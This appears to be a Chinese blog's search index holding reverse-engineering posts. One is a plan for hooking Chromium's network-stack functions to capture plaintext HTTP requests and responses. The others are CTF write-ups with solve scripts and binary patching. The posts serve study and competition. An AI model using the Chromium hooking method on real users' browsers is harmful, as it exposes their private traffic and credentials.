GenerateNetworkErrorLoggingReportIfError() should be called here if any // other net::Error can be returned. DCHECK_EQ(rv, ERR_IO_PENDING); return rv; } 众所周知，在实际的类方法调用时，会隐藏地传入第一个参数 this，表示当前的类对象地址。而 HttpNetworkTransaction 类中将上述两个类实例当作了成员变量，我们只需要在该类被创建时建立上述两个类实例到 HttpNetworkTransaction 的连接映射，即可将他们组合到一起。这个类也可以帮助我们组合后续的 Response。 请求的 url 和请求的 method 也在此处入参获取。 ","date":"2024-05-28","objectID":"/chromium/:5:0","tags":null,"title":"Chromium 内核 hook 抓包实战记录","uri":"/chromium/"},{"categories":null,"content":"ResponseHeaders 获取 Request 是散装的，Response 总应该是完整读取的吧？ 其实不然，Chromium 在读取完 ResponseHeaders 之后，才会通知上层，由上层再主动下来读取 ResponseBody。 但是确实，我们可以一次性获得完整的 ResponseHeader。 int HttpNetworkTransaction::DoReadHeaders() { next_state_ = STATE_READ_HEADERS_COMPLETE; return stream_-\u003eReadResponseHeaders(io_callback_); } stream 随使用的请求协议而变化，这不是很好，我们不如关心 ResponseHeader 的解析逻辑。 在 HttpNetworkTransaction 类成员里，我们看到了类成员 HttpResponseInfo 的成员 HttpResponseHeaders 的构造函数。 HttpResponseHeaders::HttpResponseHeaders( BuilderPassKey, HttpVersion version, std::string_view status, base::span\u003cconst std::pair\u003cstd::string_view, std::string_view\u003e\u003e headers) : http_version_(version) { // This must match the behaviour of Parse(). We don't use Parse() because // avoiding the overhead of parsing is the point of this constructor. std::string formatted_status; formatted_status.reserve(status.size() + 1); // ParseStatus() may add a space response_code_ = ParseStatus(status, formatted_status); // First calculate how big the output will be so that we can allocate the // right amount of memory. size_t expected_size = 8; // \"HTTP/x.x\" expected_size += formatted_status.size(); expected_size += 1; // \"\\\\0\" size_t expected_parsed_size = 0; // Track which headers (by index) have a comma in the value. Since bools are // only 1 byte, we can afford to put 100 of them on the stack and avoid // allocating more memory 99.9% of the time. absl::InlinedVector\u003cbool, 100\u003e header_contains_comma; for (const auto\u0026 [key, value] : headers) { expected_size += key.size(); expected_size += 1; // \":\" expected_size += value.size(); expected_size += 1; // \"\\\\0\" // It's okay if we over-estimate the size of `parsed_`, so treat all ',' // characters as if they might split the value to avoid parsing the value // carefully here. const size_t comma_count = base::ranges::count(value, ',') + 1; expected_parsed_size += comma_count; header_contains_comma.push_back(comma_count); } expected_size += 1; // \"\\\\0\" raw_headers_.reserve(expected_size); parsed_.reserve(expected_parsed_size); // Now fill in the output. const uint16_t major = version.major_value(); const uint16_t minor = version.minor_value(); CHECK_LE(major, 9); CHECK_LE(minor, 9); raw_headers_.append(\"HTTP/\"); raw_headers_.push_back('0' + major); raw_headers_.push_back('.'); raw_headers_.push_back('0' + minor); raw_headers_.append(formatted_status); raw_headers_.push_back('\\\\0'); // It is vital that `raw_headers_` iterators are not invalidated after this // point. const char* const data_at_start = raw_headers_.data(); size_t index = 0; for (const auto\u0026 [key, value] : headers) { CheckDoesNotHaveEmbeddedNulls(key); CheckDoesNotHaveEmbeddedNulls(value); // Because std::string iterators are random-access, end() has to point to // the position where the next character will be appended. const auto name_begin = raw_headers_.cend(); raw_headers_.append(key); const auto name_end = raw_headers_.cend(); raw_headers_.push_back(':'); auto values_begin = raw_headers_.cend(); raw_headers_.append(value); auto values_end = raw_headers_.cend(); raw_headers_.push_back('\\\\0'); // The HTTP/2 standard disallows header values starting or ending with // whitespace (RFC 9113 8.2.1). Hopefully the same is also true of HTTP/3. // TODO(crbug.com/40282642): Validate that our implementations // actually enforce this constraint and change this TrimLWS() to a DCHECK. HttpUtil::TrimLWS(\u0026values_begin, \u0026values_end); AddHeader(name_begin, name_end, values_begin, values_end, header_contains_comma[index] ? ContainsCommas::kYes : ContainsCommas::kNo); ++index; } raw_headers_.push_back('\\\\0'); CHECK_EQ(expected_size, raw_headers_.size()); CHECK_EQ(data_at_start, raw_headers_.data()); DCHECK_LE(parsed_.size(), expected_parsed_size); DCHECK_EQ('\\\\0', raw_headers_[raw_headers_.size() - 2]); DCHECK_EQ('\\\\0', raw_headers_[raw_headers_.size() - 1]); } 可以发现该类在构造时把整个 header 传入了 raw_headers_，这是一个 string 变量，也就是说我们可以在 Headers 被读取完之后的任意时机直接从 HttpNetworkTransaction 的 this 地址找到这些信息。 ","date":"2024-05-28","objectID":"/chromium/:6:0","tags":null,"title":"Chromium 内核 hook 抓包实战记录","uri":"/chromium/"},{"categories":null,"content":"ResponseBody 获取 这里的难点本来在于如何确定 ResponseBody 已经被全部读取完成，但是 chromium 的垃圾回收帮我们解决了这一难题： int HttpNetworkTransaction::DoReadBody() { DCHECK(read_buf_.get()); DCHECK_GT(read_buf_len_, 0); DCHECK(stream_ != nullptr); next_state_ = STATE_READ_BODY_COMPLETE; return stream_-\u003eReadResponseBody( read_buf_.get(), read_buf_len_, io_callback_); } int HttpNetworkTransaction::DoReadBodyComplete(int result) { // We are done with the Read call. bool done = false; if (result \u003c= 0) { DCHECK_NE(ERR_IO_PENDING, result); done = true; } // Clean up connection if we are done. if (done) { // Note: Just because IsResponseBodyComplete is true, we're not // necessarily \"done\". We're only \"done\" when it is the last // read on this HttpNetworkTransaction, which will be signified // by a zero-length read. // TODO(mbelshe): The keep-alive property is really a property of // the stream. No need to compute it here just to pass back // to the stream's Close function. bool keep_alive = stream_-\u003eIsResponseBodyComplete() \u0026\u0026 stream_-\u003eCanReuseConnection(); stream_-\u003eClose(!keep_alive); // Note: we don't reset the stream here. We've closed it, but we still // need it around so that callers can call methods such as // GetUploadProgress() and have them be meaningful. // TODO(mbelshe): This means we closed the stream here, and we close it // again in ~HttpNetworkTransaction. Clean that up. // The next Read call will return 0 (EOF). // This transaction was successful. If it had been retried because of an // error with an alternative service, mark that alternative service broken. if (!enable_alternative_services_ \u0026\u0026 retried_alternative_service_.protocol != kProtoUnknown) { HistogramBrokenAlternateProtocolLocation( BROKEN_ALTERNATE_PROTOCOL_LOCATION_HTTP_NETWORK_TRANSACTION); session_-\u003ehttp_server_properties()-\u003eMarkAlternativeServiceBroken( retried_alternative_service_, network_anonymization_key_); } #if BUILDFLAG(ENABLE_REPORTING) GenerateNetworkErrorLoggingReport(result); #endif // BUILDFLAG(ENABLE_REPORTING) } // Clear these to avoid leaving around old state. read_buf_ = nullptr; read_buf_len_ = 0; return result; } body 被读入 read_buf ，在读入结束后该指针会被清空。 也就是说，我们 hook HttpNetworkTransaction::DoReadBodyComplete，在该函数进入之前存下 read_buf 指针，在该函数退出之后若该指针被清空，则说明读取已完成，这时候我们可以从先前存下的指针位置读取完整的 Body。 为了减少工作量，在这个阶段所有的 ResponseHeader 一定已经被全部读取完成，我们可以在该函数的 hook 逻辑中顺手打印。 ","date":"2024-05-28","objectID":"/chromium/:7:0","tags":null,"title":"Chromium 内核 hook 抓包实战记录","uri":"/chromium/"},{"categories":null,"content":"定位和实现 到这里我们的实现思路已经很明显了： Hook 函数 HttpNetworkTransaction::Start 从入参获取 url 和 method。 建立 HttpRequestHeaders -\u003e HttpNetworkTransaction 映射。 建立 UploadDataStream -\u003e HttpNetworkTransaction 映射。 Hook 函数 UploadDataStream::Read 读取入参 IOBuffer，获取 RequestBody。 根据前面建立的映射，将 RequestBody 关联到 HttpNetworkTransaction 。 Hook 函数 HttpRequestHeaders::SetHeader 读取入参 key 和 value。 将本次添加的 Header 关联到 HttpNetworkTransaction。 Hook 函数 HttpNetworkTransaction::DoReadBodyComplete 判断请求是否完成，若未完成则继续接收。 根据调用前缓存的 read_buf_ 获取 ResponseBody 根据 content encoding 进行解压（如 gzip） 寻找 HttpNetworkTransaction-\u003eresponseinfo-\u003eresponseheaders-\u003eraw_headers_ 获取完整的 RequestHeaders 具体上述类成员偏移和函数偏移确定方式不公开，相信各位读者都有自己的理解。 项目代码：如果你想要，那你就得自己来写。 ","date":"2024-05-28","objectID":"/chromium/:8:0","tags":null,"title":"Chromium 内核 hook 抓包实战记录","uri":"/chromium/"},{"categories":null,"content":"碎碎念 本文也可以改名《Shino 为什么是一个啥比》，一个首波逆向题坐牢两天没做出来（还是我太菜了） 主要是复盘记录一下当时做题的几个思路和分析以及反思，虽然都没有成功但是也算一次经验积累，以供以后参考。 ","date":"2023-12-13","objectID":"/0gn/:1:0","tags":null,"title":"0ctf/tctf2023-0gn nodejs引擎魔改分析","uri":"/0gn/"},{"categories":null,"content":"赛时分析 ","date":"2023-12-13","objectID":"/0gn/:2:0","tags":null,"title":"0ctf/tctf2023-0gn nodejs引擎魔改分析","uri":"/0gn/"},{"categories":null,"content":"js部分 解混淆 首先格式化一下js，然后简单看一下混淆的大概pattern。 有一个函数表，类似这样（节选） var i = { 'kwUyT': '3|6|4|2|0|1|5', 'ayHHB': function(H, I) { return H \u0026 I; }, 'gqHZW': function(H, I) { return H \u0026 I; }, 'bLOAn': function(H, I) { return H ^ I; }, 'NoEaD': function(H, I) { return H \u0026 I; }, 'ZUNMN': function(H, I) { return H ^ I; }, 'HpUmq': function(H, I) { return H ^ I; }, 'GXcYX': function(H, I) { return H ^ I; }, 'fMkag': function(H, I, J) { return H(I, J); }, 'WtIoQ': function(H, I, J) { return H(I, J); } } 这里解混淆的思路是显然的，通过正则或手动将被混淆的函数名直接替换为对应的操作。如： 'bLOAn': function(H, I) { return H ^ I; } 搜索代码中全部的'bLOAn'替换为^，可以获得完整可读的代码逻辑。 这里通过常量识别可以发现是一个md5，没有任何魔改，哈希结果对应的即为默认输入flag{00000000000000000000000000000000}。但是输出结果为Wrong!，可以判断是nodejs被魔改。 ","date":"2023-12-13","objectID":"/0gn/:2:1","tags":null,"title":"0ctf/tctf2023-0gn nodejs引擎魔改分析","uri":"/0gn/"},{"categories":null,"content":"nodejs 魔改点初步定位 尝试进行黑盒测试来猜测 nodejs 的魔改位置。我们先看一下整体 js 进行 flagcheck 的流程： class a { static['resultchecker'](c) { var d = { 'vZhID': function(f, g) { return f(g); }, 'EVeqn': function(f, g) { return f == g; }, 'TgcSD': 'cd9e459ea708a948d5c2f5a6ca8838cf' }; var e = d['vZhID'](MMM, c); //md5 if (d['EVeqn'](e, d['TgcSD'])) { return 0x0; //pos1 } else { return -0x1; } } static['flagchecker']() { if (c['=='](process['argv']['length'], 0x3)) { var d = process['argv'][0x2]; console['log'](c['your_input_is'], d); } else { return -0x1; } if (c['!='](d['length'], 0x26)) { return -0x1; } //flag 格式 check 省略 var e = d['slice'](0x5, c['+'](0x5, 0x20)); e = new Buffer['from'](e); if (a['resultchecker'](e) != 0x0) { return -0x1; //pos2 } return 0x0; } } function b() { if (a['flagchecker']() == 0x0) { console['log']('Right!'); } else { console['log']('Wrong!'); //pos3 } } b(); 这里我们先假设 nodejs 没有对被运行的 js 进行完整性校验，即我们可以用他的引擎运行任意的脚本进行测试。如果测试中可以触发Right!则可以判定不存在这种可能。 通过在脚本中进行console.log，可以发现输入 flag 为 flag{00000000000000000000000000000000} 时，得到的执行路径是 pos1-\u003epos2-\u003epos3 （在上面代码中标出） 这里可以发现resultchecker的执行到return 0x0，但是主函数得到的返回值却是-0x1矛盾。 我们来思考一下几种可能性并且用我们观察到的现象来验证一下： resultchecker中的某些运算符被重载或常量被替换： 尝试在 pos1 处输出 e 和密文，发现他们没被更改，且==正常工作（返回true），否定这种可能性 resultchecker被替换： 在 pos1 处添加的输出语句能被执行，说明resultchecker内的逻辑有被执行，否定这种可能性 resultchecker被某种方式 hook （可能的） Return或其相关的字节码解析操作被改写（可能的） 注意到上面的3、4操作本质上是相同的。 ","date":"2023-12-13","objectID":"/0gn/:2:2","tags":null,"title":"0ctf/tctf2023-0gn nodejs引擎魔改分析","uri":"/0gn/"},{"categories":null,"content":"hook 时机和条件定位 一般来说 hook 一个函数必须要先找到这个函数。虽然我不会 js，但是这些方法一般是通用的。寻找函数的方法大概如下（可能我经验不足接触得较少）： 函数名称 函数签名 函数偏移 函数特征（一般是特征字符串的引用） 简单进行一下测试： class a { static resultchecker(c) { return 0; //result: -1 } static resultche2ker(c) { return 0; //result: 0 } static aaaresultcheckeraaa(c) { return 0; //result: -1 } static resultchecker(c, c) { //实际上这里是分两次测试的，为了好看写在一起，下同 return 0; //result: 0 } static resultchecker(c) { return 114514; //result: 114514 } } class b { static resultchecker(c) { return 0; //result: -1 } } 可以得出函数触发 hook 的条件为： 函数名中包含resultchecker字符串 返回0或-1（这里-1无法被验证） 只传入一个参数 这里很明显是通过函数名称来定位的函数，同时因为 hook 是否触发与返回值有关，因此 hook 时机一定在 return 之后。 ","date":"2023-12-13","objectID":"/0gn/:2:3","tags":null,"title":"0ctf/tctf2023-0gn nodejs引擎魔改分析","uri":"/0gn/"},{"categories":null,"content":"hook 函数定位 由于没有发现可见字符串resultchecker（详见“复盘”节《为什么说 Shino 是一个啥比》），尝试通过以下方法进行 hook 函数定位。这里就是记录一下，实际上没有能跑通的方法。 由于我对 nodejs 内核没有任何的了解，所以我的调试方法是添加console.log语句并且监控write系统调用（只要有输出必定有调用）来在 js 函数内部添加断点。 由于我的 Cheat Engine 爆炸了，并且没有合适的时机进行 Attach （这里我觉得是我技不如人），所以没有先把程序跑起来再在内存中搜可见字符串这种操作（这里我觉得是我技不如人，我觉得这个方法应该是可行的，等师傅们教我） 调用链 diff （忘了hook时机在 return 之后，弱智了） Bindiff 实际上由于题目的 nodejs 的编译环境和官方的完全不一样，导入的模块也不一样，可以说结果没有一点相同的 跟踪输入下读写断点 在 String 的 New 方法里找输入（没找到） 在 Argument Parse 的相关方法里找输入（没找到） 或者说我连上面那两个方法都没找到，好吧（其实我的ida完全不能完整加载这个node的binary（太大了），所以我没法进行函数搜索或者等等操作，一搜索就会卡死，该换电脑了） 跟踪字节码编译或 log 执行的字节码 这种情况仅限于 hook 代码也在 js 层，事实上 hook 代码是在引擎里的，所以这里的相关尝试都失败了 针对字节码魔改： diff 字节码表，使用 nodejs 自带的 log 来记录字节码记录顺序 在最后一步的尝试中我们确实知道了是在 Bytecode 的相关方法内进行了魔改，但是直到比赛结束也没有找到这个方法。 ","date":"2023-12-13","objectID":"/0gn/:2:4","tags":null,"title":"0ctf/tctf2023-0gn nodejs引擎魔改分析","uri":"/0gn/"},{"categories":null,"content":"复盘 ","date":"2023-12-13","objectID":"/0gn/:3:0","tags":null,"title":"0ctf/tctf2023-0gn nodejs引擎魔改分析","uri":"/0gn/"},{"categories":null,"content":"为什么说 Shino 是一个啥比 接下来揭秘一下我为什么没有找到可见字符串。 划重点：这种短字符串常量会被编译优化为上面这个样子，所以如果在 hex 里搜索resultch（8位）是可以搜到的，但是resultchecker不行。 菜死我了，长记性了（但凡打字慢一点就搜到了，我也搜过hex ","date":"2023-12-13","objectID":"/0gn/:3:1","tags":null,"title":"0ctf/tctf2023-0gn nodejs引擎魔改分析","uri":"/0gn/"},{"categories":null,"content":"hook 逻辑分析 修改点位于v8::internal::interpreter::BytecodeGenerator::VisitCall 下载nodejsv16.18.0找到源码：src/interpreter/bytecode-generator.cc 在 switch case 的 2 3 8，对应源码的三种调用方法： case Call::NAMED_PROPERTY_CALL: case Call::KEYED_PROPERTY_CALL: case Call::PRIVATE_CALL: 判断函数名称中包含resultchecker: 并且参数个数为2（还有一个this.context）： 满足以上条件的时候执行一些额外操作。 看起来操作是按位比较，每一位比较的逻辑大致如下： v33 = v8::internal::interpreter::BytecodeRegisterAllocator::NewRegister(v916); v8::internal::interpreter::BytecodeArrayBuilder::LoadLiteral(v26, 0LL); v8::internal::interpreter::BytecodeArrayBuilder::StoreAccumulatorInRegister(v26, v33); v36 = v8::internal::FeedbackVectorSpec::AddSlot(*(_QWORD *)(a1 + 504) + 56LL, 8LL, v34, v35); v8::internal::interpreter::BytecodeArrayBuilder::LoadKeyedProperty(v26, v32, v36); v39 = v8::internal::FeedbackVectorSpec::AddSlot(*(_QWORD *)(a1 + 504) + 56LL, 15LL, v37, v38); v8::internal::interpreter::BytecodeArrayBuilder::BinaryOperationSmiLiteral( (__int64)v26, 38, 0x3E00000000LL, v39); v42 = *(_QWORD *)(a1 + 528); v43 = *(_BYTE *)(v42 + 121) \u0026 1; if ( (*(_BYTE *)(v42 + 121) \u0026 1) != 0 ) { v44 = *(_QWORD *)(a1 + 504); v45 = 13LL; } else { v44 = *(_QWORD *)(a1 + 504); v45 = 3LL; } 比较关键的是这个：v8::internal::interpreter::BytecodeArrayBuilder::BinaryOperationSmiLiteral(v26,38,0x3E00000000LL,v39); 源码：src/interpreter/bytecode-array-builder.h 运算token定义：src/parsing/token.h 操作有38、47、48三种，分别对应： 38：BIT_XOR 47：ADD 48：SUB 算法流程为修改输入之后调用以下逻辑，以下逻辑执行完毕后修改回去。 v449 = v8::internal::FeedbackVectorSpec::AddSlot(v447 + 56, v448, v443, v444); v8::internal::interpreter::BytecodeArrayBuilder::StoreKeyedProperty(v26, v32, v33, v449, v446); v8::internal::interpreter::BytecodeArrayBuilder::LoadLiteral(v26, 0x6A8838CF00000000LL); v8::internal::interpreter::BytecodeArrayBuilder::StoreAccumulatorInRegister(v26, v921); v8::internal::interpreter::BytecodeArrayBuilder::CallRuntime(v26, 475LL, params_count); v922 = v8::internal::interpreter::BytecodeRegisterAllocator::NewRegister(v916); v8::internal::interpreter::BytecodeArrayBuilder::StoreAccumulatorInRegister(v26, v922); 调用了 475 号 Runtime 函数，参考https://zhuanlan.zhihu.com/p/431621841 char *__fastcall v8::internal::Runtime::FunctionForId(int a1) { return (char *)\u0026unk_555E3A49FD00 + 32 * a1; } 通过上面的函数表可知调用了函数 v8::internal::Runtime_TypedArrayVerify，可以看到这个函数被改动过，包含一个check逻辑 逆向算法即可得到答案。 exp（有点难调） cip = [0x28, 0xA5, 0xA9, 0xCD, 0x34, 0x0A, 0xB9, 0xB2, 0xF2, 0x54, 0xE5, 0x56, 0x68, 0x41, 0xFD, 0xEE, 0x1A, 0xE8, 0x33, 0xB3, 0x25, 0x8A, 0x97, 0xB9, 0xD0, 0xAC, 0xCD, 0xF0, 0x85, 0xBA, 0x07, 0xEB] op = [38, 47, 47, 47, 47, 48, 48, 47, 48, 48, 48, 48, 48, 38, 47, 48, 47, 38, 48, 47, 38, 47, 38, 48, 47, 48, 38, 47, 38, 38, 47, 48] data = [0x3e, 0x64, 0x5c, 0x22, 0xe7, 0x7a, 0x17, 0xa2, 0xa2, 0xd2, 0xef, 0xb9, 0x76, 0x63, 0x11, 0x1c, 0xe2, 0x0b, 0x48, 0x2d, 0x87, 0xb7, 0x46, 0x07, 0xf2, 0x1a, 0xc4, 0x81, 0x3a, 0x87, 0x76, 0x6e] def convert(x, i): x = (x+0x100-i)\u00260xFF if op[i] == 38: return chr((x^data[i])\u00260xff) if op[i] == 47: return chr((x+0x100-data[i])\u00260xff) if op[i] == 48: return chr((x+data[i])\u00260xff) def long_to_arr(x): return [x\u00260xff, (x\u003e\u003e8)\u00260xff, (x\u003e\u003e16)\u00260xff, (x\u003e\u003e24)\u00260xff] def arr_to_long(x): return x[0]+(x[1]\u003c\u003c8)+(x[2]\u003c\u003c16)+(x[3]\u003c\u003c24) def tea(v46, v47, v44_LO, v44_HI): v42 = 0x5e9a8211 v43 = 0x1c108262 v45 = 0xF4DCA6E0 while v45 != 0: v47 += 0x100000000 v47 -= ((v45 + v46)\u00260xFFFFFFFF) ^ ((v43 + ((v46 \u003e\u003e 5)\u00260xFFFFFFFF))\u00260xFFFFFFFF) ^ ((v42 + ((v46 \u003c\u003c 4)\u00260xFFFFFFFF))\u00260xFFFFFFFF) v47 \u0026= 0xFFFFFFFF v46 += 0x100000000 v46 -= ((v47 + v45)\u00260xFFFFFFFF) ^ ((v43 + ((v47 \u003e\u003e 5)\u00260xFFFFFFFF))\u00260xFFFFFFFF) ^ ((v42 + ((v47 \u003c\u003c 4)\u00260xFFFFFFFF))\u00260xFFFFFFFF) v46 \u0026= 0xFFFFFFFF v45 += 0x68591AC9 v45 \u0026= 0xFFFFFFFF v46 ^= v44_LO v47 ^= v44_HI return v46, v47 v40 = 0x6a8838cf v44_HI = v40 ^ 0xA14BC8DF v44_LO = v40 ^ 0x6527B8CF for i in range(0, 32, 8): a, b = tea(arr_to_long(cip[i:i+4]), arr_to_long(cip[i+4:i+8]), v44_LO, v44_HI) v44_LO = arr_to_long(cip[i:i+4]) v44_HI = arr_to_long(cip[i+4:i+8]) arr = long_to_arr(a) + long_to_arr(b) for j in range(8): print(convert(arr[j]","date":"2023-12-13","objectID":"/0gn/:3:2","tags":null,"title":"0ctf/tctf2023-0gn nodejs引擎魔改分析","uri":"/0gn/"},{"categories":null,"content":"碎碎念 应该是在 Straw Hat 队认真打的第一场国际赛事吧，可惜半天左右就把逆向全打完了（驾驶员技能发动 我一个人就够了.jpg），有些失望（但是很爽）。 写于 2023-09-09 23:25 离比赛结束还有 1day 左右，但是目前放出的 Reverse 已经全部 AK 了，没事干了写个 Writeups 先。感觉目前放出的 Reverse 难度总体偏易，大概 CrazyArcade \u003c Full Chain - The Blade \u003c LessEQualmore 吧，这里按打题顺序简单写一下复盘。 ","date":"2023-09-09","objectID":"/hitcon2023/:1:0","tags":null,"title":"Hitcon2023 Reverse wps | AK with StrawHat","uri":"/hitcon2023/"},{"categories":null,"content":"LessEQualmore 虚拟机的逻辑非常简单，每个指令为 3 个字长a1 a2 a3，假设存在mem[]里 逻辑伪代码大概如下： if a1 \u003c 0: data = input() else: data = mem[a1] if a2 \u003c 0: output(data) else: mem[a2] = data if mem[a2] \u003c= 0: jmp a3 然后就是逆向字节码了，这个字节码非常复杂，需要考虑一种方法去除我们不需要的指令。可以运用类似编译原理中常量传播的思想，追踪所有与输入数据相关的数据位置，dump一份只和输入相关的指令： with open(\"chal.txt\", \"r\") as rf: x = ' '.join([y.strip('\\n') for y in rf.readlines()]) buf = [int(y) for y in x[:-1].split(' ')] input_pos = [] i = 0 input_flag = \"hitcon{r\\n\" input_pos = [i for i in range(16, 16+8, 1)] what_buf = \"\" j = 0 while i \u003e= 0: a1 = buf[i] a2 = buf[i+1] a3 = buf[i+2] if a1 \u003c 0: what_buf += f\"INPUT TO [{a2}](origin:{buf[a2]}), dest {a3}\\n\" buf[a2] -= -ord(input_flag[j]) j += 1 if buf[a2] \u003e 0: i += 3 else: i = a3 i = a3 if a2 \u003c 0: what_buf += f\"OUTPUT [{a1}]{chr(buf[a1])}, dest {a3}\\n\" if chr(buf[a1]) == '!': for i in range(16, 16+21, 1): print(buf[i], end=\" \") i = a3 if a1 \u003e= 0 and a2 \u003e= 0: if a1 not in input_pos and a2 not in input_pos: buf[a2] -= buf[a1] if buf[a2] \u003c= 0: i = a3 else: i += 3 else: what_buf += f\"INPUT RELATED: buf[{a2}] -= buf[{a1}](origin:buf[{a1}]={buf[a1]},buf[{a2}]={buf[a2]})\\n\" if a1 in input_pos and a2 not in input_pos: input_pos.append(a2) buf[a2] -= buf[a1] if buf[a2] == 0 and a2 not in range(16, 16+8, 1): #print(f\"[{a2}] is considered a constraint\") what_buf += f\"[{a2}] is considered a constraint\\n\" input_pos.remove(a2) if buf[a2] \u003e 0: i += 3 else: i = a3 with open(\"log.txt\", \"w\") as f: f.write(what_buf) print(\"\") print(len(what_buf)) 上面的代码是经过多次逆向和修改后的最终代码，range(16, 16+8, 1)是在dump指令得出输入数据存储位置之后加上的，这个定位和上面追踪输入的思路类似。 需要注意的是，可以发现对buf[0]~buf[4]的操作非常多，不难发现他们是寄存器类似用途的内存，所以当这部分数据等于0时可以认定它们不再与输入有关并且停止追踪。这样可以dump出一份相对短的代码。 从这段字节码可以看出只涉及简单的加减操作（本来以为有用减法实现其他运算的骚操作），那么最后的算法一定是一个多项式或矩阵。 观察并打印一下算法结束后的buf数组，可以观察到输入位置的数据发生了变化，可以推测加密后的数据是存在原地的。 接下来手动fuzz一下，看看变动输入数据发生的变化。首先以hitcon{test_flag}为例dump一份加密数据，改为hitcon{sest_flag}再dump一份加密数据，可以发现只有前8位发生了变化，结合诸多类似方式的验证可以知道flag验证为8位一组。 顺便某一次得到的密文是[16774156, 1396, 16776307, 3691, 1558, 6506, 2587, 10]，由于flag开头hitcon{就占了7位，所以此时得到的密文一定和正确密文相差不大，在chal.txt里面寻找类似的东西，可以找到密文（就在输入数据和输出的字符串中间，肯定没问题） cip = [16774200, 1411, 16776275, 3646, 1532, 6451, 2510, 16777141, 16775256, 2061, 16776706, 2260, 2107, 6124, 878, 16776140, 16775299, 1374, 16776956, 2212, 1577, 4993, 1351, 16777040, 16774665, 1498, 16776379, 3062, 1593, 5966, 1924, 16776815, 16774318, 851, 16775763, 3663, 711, 5193, 2591, 16777069, 16774005, 1189, 16776283, 3892, 1372, 6362, 2910, 307, 16775169, 1031, 16776798, 2426, 1171, 4570, 1728, 33, 16775201, 819, 16776898, 2370, 1132, 4255, 1900, 347] 得到正确密文之后，由于flag开头只剩一位，可以手动爆破一下知道flag的前8位是hitcon{r 有了一组flag，结合前面加密算法为矩阵方程组的推测，可以直接弄出矩阵的系数。具体来说，对每一位依次加一，例如传入iitcon{r，那么得到的密文和正确密文的差值便是该项在该方程中的系数。 顺便由于1677….是2^24，简单猜测一下那个是负数标记。 def execute(input_flag, nowpos): with open(\"chal.txt\", \"r\") as rf: x = ' '.join([y.strip('\\n') for y in rf.readlines()]) buf = [int(y) for y in x[:-1].split(' ')] input_pos = [] i = 0 input_pos = [i for i in range(16, 16+8, 1)] what_buf = \"\" j = 0 calres = 0 while i \u003e= 0: a1 = buf[i] a2 = buf[i+1] a3 = buf[i+2] if a1 \u003c 0: what_buf += f\"INPUT TO [{a2}](origin:{buf[a2]}), dest {a3}\\n\" buf[a2] -= -ord(input_flag[j]) j += 1 if buf[a2] \u003e 0: i += 3 else: i = a3 i = a3 if a2 \u003c 0: what_buf += f\"OUTPUT [{a1}]{chr(buf[a1])}, dest {a3}\\n\" if chr(buf[a1]) == '!': #print(buf[16:16+8]) return buf[16+nowpos] i = a3 if a1 \u003e= 0 and a2 \u003e= 0: if a1 not in input_pos and a2 not in input_pos: buf[a2] -= buf[a1] if buf[a2] \u003c= 0: i = a3 else: i += 3 else: what_buf += f\"INPUT RELATED: buf[{a2}] -= buf[{a1}](origin:buf[{a1}]={buf[a1]},buf[{a2}]={buf[a2]})\\n\" if a1 in input_pos and a2 not in input_pos: input_pos.append(a2) buf[a2] -= buf[a1] if buf[a2] == 0 and a2 not in range(16, 16+8, 1): #print(f\"[{a2}] is considered a constraint\") what_buf += f\"[{a2}] is considered a constraint\\n\" input_pos.remove(a2) if buf[a2] \u003e 0: i += 3 else: i = a3 ori_flag = \"hitcon{r\\n\" targetres = [16774200, 1411, 16776275, 3646, 1532, 6451, 2510, 16777141] matrix = [] for pos in range(8): xi = [] for j in range(8)","date":"2023-09-09","objectID":"/hitcon2023/:2:0","tags":null,"title":"Hitcon2023 Reverse wps | AK with StrawHat","uri":"/hitcon2023/"},{"categories":null,"content":"CrazyArcade 给了一个泡泡堂游戏和一个驱动，简单找一下 WIN 逻辑 if ( (unsigned int)dword_7FF63A836238 \u003c 0x1337 ) { v6 = 5i64; v7 = \"PAUSE\"; } else { v6 = 3i64; v7 = \"WIN\"; } 要求 dword_7FF63A836238 \u003e= 0x1337 查引用 int __fastcall sub_7FF63A8230A0(__int64 a1) { int *v2; // rax unsigned int v3; // ecx DWORD lpBytesReturned[2]; // [rsp+40h] [rbp-88h] BYREF DWORD BytesReturned; // [rsp+48h] [rbp-80h] BYREF __int64 OutBuffer[3]; // [rsp+50h] [rbp-78h] BYREF int v8; // [rsp+68h] [rbp-60h] __int128 v9; // [rsp+6Ch] [rbp-5Ch] int v10; // [rsp+7Ch] [rbp-4Ch] __int64 InBuffer[3]; // [rsp+80h] [rbp-48h] BYREF int v12; // [rsp+98h] [rbp-30h] int v13; // [rsp+9Ch] [rbp-2Ch] __int128 v14; // [rsp+A0h] [rbp-28h] sub_7FF63A823850(a1, lpBytesReturned); v2 = dword_7FF63A8362E0; if ( dword_7FF63A8362E0[15 * lpBytesReturned[1] + lpBytesReturned[0]] == 5 ) { if ( byte_7FF63A834038 ) LODWORD(v2) = Mix_PlayChannel(1i64, qword_7FF63A8362D0, 0i64); v3 = dword_7FF63A836238; *(_BYTE *)(a1 + 20) = 1; if ( v3 \u003c 4919 ) { v8 = 1; OutBuffer[0] = 0i64; v9 = 0i64; OutBuffer[2] = 0i64; v10 = 0; OutBuffer[1] = qword_7FF63A836240 + 12288 + v3 % 0x25; DeviceIoControl(hDevice, 0x80002048, OutBuffer, 0x30u, OutBuffer, 0x30u, \u0026BytesReturned, 0i64); v14 = 0i64; InBuffer[0] = 0i64; InBuffer[2] = 0i64; v12 = 1; InBuffer[1] = dword_7FF63A836238 % 0x25u + qword_7FF63A836240 + 12288; v13 = (unsigned __int8)(dword_7FF63A836238 ^ v9) ^ *(unsigned __int8 *)(dword_7FF63A836238 % 0x584u + qword_7FF63A836248); LODWORD(v2) = DeviceIoControl(hDevice, 0x8000204C, InBuffer, 0x30u, InBuffer, 0x30u, lpBytesReturned, 0i64); ++dword_7FF63A836238; } } return (int)v2; } 尝试触发这个++dword_7FF63A836238，直接patch掉if ( dword_7FF63A8362E0[15 * lpBytesReturned[1] + lpBytesReturned[0]] == 5 )的条件变成不等于。 启动游戏发现一开始敌人全死了，Cheat Engine看dword_7FF63A836238变成了4（一共4个敌人） 不小心玩死了自己 GameOver 重来发现 dword_7FF63A836238 变成了 8，可以发现重来之后这个计数不清零。 写个脚本重复炸死自己（这里patch后敌人会被开局杀），挂亿会之后cheat engine在内存里搜hitcon得到flag。 感觉非预期了，开题到出解题思路不到十分钟 ","date":"2023-09-09","objectID":"/hitcon2023/:3:0","tags":null,"title":"Hitcon2023 Reverse wps | AK with StrawHat","uri":"/hitcon2023/"},{"categories":null,"content":"Full Chain - The Blade 逻辑在 verify 函数，打乱+逐位数字计算，不用逆直接动调打表就行。 